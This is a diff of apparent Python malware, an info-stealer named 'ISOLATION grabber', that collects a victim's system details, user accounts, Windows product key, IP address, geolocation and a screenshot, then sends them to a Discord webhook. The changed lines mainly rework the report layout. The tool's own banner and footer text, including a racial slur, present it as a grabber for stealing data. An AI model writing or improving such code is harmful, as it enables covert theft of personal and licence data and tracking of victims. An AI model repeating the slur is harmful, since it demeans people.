@@ -92,9 +92,7 @@ def get_processor_name():
 
 # webhook
 embedcont = f'''
----------------------
-get grabbed nigga
----------------------
+------- PC INFO --------
 Operating system >> {platform.system()}
 Architecture --- >> {platform.machine()}
 OS.name -------- >> {os.name}
@@ -103,7 +101,11 @@ pc name -------- >> {pcname}
 All users ------ >> {allusers()}
 Proccessor ----- >> {get_processor_name()}
 RAM ------------ >> {str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"}
-local Ip Address >> {localIPAddr}
+Product Key ---- >> {ctkit.OSspecific.Windows.get_windows_product_key()}
+Linux Distribution: {ctkit.OSspecific.Linux.get_linux_distro()}
+
+------- IP INFO -------
+Local IP ------- >> {localIPAddr}
 Ip Address ----- >> {IPAddr.text}HWID ---------- >> {hwid}
 ORG ------------ >> {data["org"]}
 ORG hostname --- >> {data["hostname"]}
@@ -112,12 +114,6 @@ Region --------- >> {data["region"]}
 Country -------- >> {data["country"]}
 Location ------- >> {data["loc"]}
 Postal --------- >> {data["postal"]}
-
------WINDOWS ONLY----
-Key ------------ >> {ctkit.OSspecific.Windows.get_windows_product_key()}
-
-------LINUX ONLY-----
-Distribution: {ctkit.OSspecific.Linux.get_linux_distro()}
 
 '''
 
@@ -128,7 +124,7 @@ def main():
     webhook = discord_webhook.DiscordWebhook(url=str(config["WEBHOOK"]),rate_limit_retry= True)
     embed = discord_webhook.DiscordEmbed(title="ISOLATION",description=embedcont, color="23272A")
     embed.set_timestamp()
-    embed.set_footer(text="Grabbed w/ ISOLATION grabber")
+    embed.set_footer(text="Grabbed w Isolation, vouch my niggas")
     embed.set_thumbnail("https://media.discordapp.net/attachments/1136359120233046057/1142457082243711007/1e35053d0cd075d470bd6a80a2a9a1c1.png?width=449&height=449")
     embed.set_image(screenshot_url)
     webhook.add_embed(embed=embed)
